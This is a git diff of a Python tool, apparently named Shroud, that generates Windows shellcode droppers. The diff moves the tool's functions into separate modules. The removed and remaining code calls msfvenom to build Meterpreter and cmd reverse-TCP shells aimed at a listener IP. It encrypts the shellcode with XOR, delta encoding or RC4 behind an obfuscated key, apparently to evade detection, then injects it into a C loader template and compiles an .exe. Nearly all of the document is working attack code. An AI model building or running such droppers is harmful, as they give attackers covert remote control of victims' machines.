@@ -4,6 +4,9 @@ import subprocess
 import os
 from itertools import cycle
 from RC4Encryption import RC4Encryption
+from modules.util import *
+from modules.encryption import *
+from modules.write import *
 
 print("""
 .▄▄ ·   ▄ .▄ ▄▄▄        ▄• ▄▌ ·▄▄▄▄  
@@ -30,244 +33,28 @@ inputgroup.add_argument('--shell', help='Generate a reverse shell (cmd) template
 parser.add_argument('-L', '--lhost', help='Listener IP for templates.')
 parser.add_argument('-P', '--lport', help='Listener port for templates.')
 
-# Encryption Grouping
-encgroup = parser.add_argument_group('encryption')
-encgroup = encgroup.add_mutually_exclusive_group()
-encgroup.add_argument('--xor', help='Use XOR encryption.', action="store_true")
-encgroup.add_argument('--delta', help='Use delta encoding from Red Siege\'s delta encoder.', action="store_true")
-encgroup.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
-
-# Generation options (add camo stuff)
-
+# Other options
+parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
 parser.add_argument('output', help='Output dropper file. Specify .exe or .dll.')
 
 args = parser.parse_args()
 
-# Generate templates if specified
-def generateTemplate():
-	if not args.lhost or not args.lport:
-		print("[-] Listener IP and port are required for templates.")
-		exit()
-	if args.msf: # Meterpreter shell
-		subprocess.run(["msfvenom","-p","windows/x64/meterpreter_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
-	if args.shell: # CMD shell
-		subprocess.run(["msfvenom","-p","windows/x64/shell_reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
-	return
-
-# Read in shellcode, byte by byte into a list
-def readShellcode(filePath):
-
-	shellcode = []
-
-	with open(filePath, "rb") as f:
-		byte = f.read(1)
-		while byte != b"":
-			shellcode.append(byte)
-			byte = f.read(1)
-
-	return shellcode
-
-# Compile to binary
-def compile():
-	if args.output.endswith(".exe"): # PE compilation
-		p = subprocess.run([f"x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./build/standard/* -o ./output/{args.output}"], shell=True, capture_output=True)
-
-	if args.output.endswith(".dll"): # DLL compilation (TO-DO)
-		print("WIP1")
-
-	if "returned 1 exit status" in p.stderr.decode():
-			print("[-] Compilation failed.")
-			exit()
-	else:
-		print("[+] Compilation successful. Check output folder.")
-		exit()
-
-	return
-
-# Takes in a list of bytes for shellcode and a list of strings for decryption blob
-def writePayload(shellcode, blob):
-
-	## Read in runner template lines
-	mainFileR = open("./build/template.c", "r")
-	mainLines = mainFileR.readlines()
-	mainFileR.close()
-	
-	## Loop over lines and update payload / size
-	newLines = []
-	for line in mainLines:
-
-		### Update payload line
-		if "BYTE pPayload[]" in line and not args.delta: ## XOR
-			line = "\tBYTE pPayload[] = { "
-			for j in range(0,len(shellcode)):
-				if j != len(shellcode)-1:
-					line += f"0x{shellcode[j].to_bytes(1,byteorder='big').hex()}, "
-				else:
-					line += f"0x{shellcode[j].to_bytes(1,byteorder='big').hex()}" + " };\n"
-
-		elif "BYTE pPayload[]" in line and args.delta: ## Delta Encoding
-			line = "\n"
-		
-		### Update size line
-		if "SIZE_T sPayloadSize" in line:
-			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"
-
-		newLines.append(line)
-
-	## Update decryption protocol
-	for i in range(0,len(newLines)):
-
-		### Add in decryption blob
-		if "SIZE_T sPayloadSize" in newLines[i]:
-			newLines[i+1:i+1] = blob
-
-	# Write to runner
-	with open("./build/standard/main.c", mode="wt", encoding="utf-8") as mainFileW:
-		for line in newLines:
-			mainFileW.write(line)
-	
-	return
-
-# Red Siege's delta encoder. Was curious so decided to add it
-def encryptDelta(shellcode):
-	# read in our raw shellcode and get the length
-	raw_sc = b''.join(shellcode)
-	sc_len = len(shellcode)
-
-	offset_arr = [] # stores the calculated offsets
-	remaining_idx = 1 # starts at 1 - second byte of shellcode
-	previous_byte = raw_sc[0] # Store previous byte we processed.
-
-	# Loop through remaining bytes of shellcode
-	while remaining_idx < sc_len:
-		# Subtract previous byte from current byte to get the offset
-		current_byte = raw_sc[remaining_idx] - previous_byte
-
-		# Add 256 if value is negative to wrap around.
-		if current_byte < 0:
-			current_byte = current_byte + 256
-
-		# Add current byte of offset array
-		offset_arr.append(current_byte)
-
-		# Update previous byte to current shellcode byte
-		previous_byte = raw_sc[remaining_idx]
-		remaining_idx += 1
-
-	return offset_arr, raw_sc, sc_len
-
-# Delta decryption blob
-def deltaBlob(offset_arr,raw_sc,sc_len):
-
-	blob = '\tunsigned char first_byte = ' + hex(raw_sc[0]) + ';\n'
-	blob += '\tunsigned char delta[{}] = '.format(str(len(offset_arr))) + "{"
-	blob += '{}'.format(', '.join((hex(x) for x in offset_arr))) + " };\n"
-	blob += '\tunsigned char pPayload[{}] = '.format(str(sc_len)) + '{ 0x00 };\n'
-	blob += """\tunsigned int i, index;
-	int cap = sizeof(delta) / sizeof(delta[0]);
-	pPayload[0] = first_byte;
-	for (i = 0; i < cap; i++)
-	{
-		\tindex = i + 1;
-		\tpPayload[index] = pPayload[i] + delta[i];
-	}"""
-	
-	return blob
-
-# XOR encryption - probably need to do 0x00 and 0xFF checks here for anti reversing key 
-def encryptXOR(shellcode):
-
-	key = os.urandom(32) # XOR KEY LENGTH!
-	byteString = b''.join(shellcode)
-	encrypted = bytes(a ^ b for a, b in zip(byteString, cycle(key)))
-	encList = []
-	for byte in encrypted:
-		encList.append(byte.to_bytes(1,byteorder='big'))
-
-	return encrypted, key
-
-# XOR decryption blob
-def xorBlob(key):
-
-	keyLine = "\tBYTE pKey[] = { "
-	for i in range(0,len(key)):
-		if i != len(key)-1:
-			keyLine += f"0x{key[i].to_bytes(1,byteorder='big').hex()}, "
-		else:
-			keyLine += f"0x{key[i].to_bytes(1,byteorder='big').hex()} " + "};\n"
-
-	blob = keyLine + f"""
-	for (size_t i = 0, j = 0; i < sPayloadSize; i++, j++) {{
-		if (j >= {len(key)})
-		{{
-			j = 0;
-		}}
-		pPayload[i] = pPayload[i] ^ pKey[j];
-	}}
-	"""
-	return blob
-
-def encryptRC4(shellcode):
-
-	key = os.urandom(32) # RC4 KEY LENGTH!
-	firstbyte = key[0]
-
-	rc4 = RC4Encryption(key)
-	rc4.make_key()
-	encrypted = rc4.encrypt(b''.join(shellcode))
-
-	# XOR'ing RC4 key
-	brutekey = os.urandom(1)
-	encKey = bytes(a ^ b for a, b in zip(key, cycle(brutekey)))
-
-	return encrypted, encKey, firstbyte
-
-def rc4Blob(encKey, firstbyte):
-
-	# Paste key and firstbyte
-	blob = f"\tBYTE bFirstByte = 0x{firstbyte.to_bytes(1,byteorder='big').hex()};\n"
-	blob += "\tPBYTE pKey = NULL;\n"
-	blob += "\tBYTE pEncKey[] = { "
-	for i in range(0,len(encKey)):
-		if i != len(encKey)-1:
-			blob += f"0x{encKey[i].to_bytes(1,byteorder='big').hex()}, "
-		else:
-			blob += f"0x{encKey[i].to_bytes(1,byteorder='big').hex()} " + "};\n"
-	blob += "\tBruteDecryption(bFirstByte, pEncKey, sizeof(pEncKey), &pKey);\n"
-	blob += "\tRc4Context ctx = { 0 };\n"
-	blob += "\tBYTE pTemp[sizeof(pPayload)];\n"
-	blob += "\trc4Init(&ctx, pKey, sizeof(pEncKey));\n"
-	blob += "\trc4Cipher(&ctx, pPayload, pTemp, sizeof(pPayload));\n"
-	blob += """\tfor (int i = 0;i < sizeof(pPayload);i++)
-	{
-		pPayload[i] = pTemp[i];
-	}\n"""
-
-	return blob
-
 def main():
+
 	#### Generate templates if necessary
 	if args.msf or args.shell:
 		print(f"[*] Generating shellcode from template. (IP: {args.lhost}, PORT: {args.lport})")
-		generateTemplate()
+		generateTemplate(args)
 		shellcode = readShellcode("./output/shellcode.raw")
 	elif args.file:
 		print(f"[*] Using custom shellcode file {args.file}")
 		shellcode = readShellcode(args.file)
 
 	#### Encrypt payload
-
-	if args.xor: # XOR
-		print("[~] Encrypting payload with XOR...")
-		shellcode, key  = encryptXOR(shellcode)
-		writePayload(shellcode, xorBlob(key))
-	elif args.delta: # DELTA
-		print("[~] Encrypting payload with deltas...")
-		offset_arr,raw_sc,sc_len = encryptDelta(shellcode)
-		writePayload(shellcode, deltaBlob(offset_arr,raw_sc,sc_len))
-	elif args.dont_encrypt: # DON'T ENCRYPT
+	if args.dont_encrypt: # DON'T ENCRYPT
 		print("[!] NOT ENCRYPTING PAYLOAD...")
 		writePayload(shellcode, None)
+
 	else: # DEFAULT - RC4
 		print("[~] Encrypting payload with RC4...")
 		shellcode, encKey, firstbyte = encryptRC4(shellcode)
@@ -275,8 +62,8 @@ def main():
 
 	#### Compile
 	print("[~] Compiling...")
-	compile()
-
+	compile(args)
+	
 
 if __name__ == '__main__':
 	main()
